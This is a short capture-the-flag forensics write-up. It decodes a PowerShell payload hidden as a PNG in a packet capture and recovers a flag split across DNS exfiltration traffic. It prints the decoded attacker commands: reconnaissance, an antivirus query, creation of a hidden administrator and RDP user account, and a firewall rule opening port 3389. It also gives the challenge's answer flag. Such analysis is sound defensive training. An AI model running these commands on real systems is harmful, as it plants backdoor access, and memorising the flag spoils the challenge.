Open pcap

Export all objects sent over http

See desktop.png and its not valid

Open with text editor and base64 decode to get the payload.ps1

Uses dns to exfil

With some modification and passing the TXT record information we get the below and decoding the base64 username in there gives us part of the flag (solve-part1.ps1)
```powershell
hostname
whoami
ipconfig
wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
```
```powershell
$part1='HTB{y0u_c4n_'
```

Continuing this further to decode the response exfil we get (solve-part2.ps1)
```powershell
$part2=4utom4t3_but_y0u_c4nt_h1de}
```
```
HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```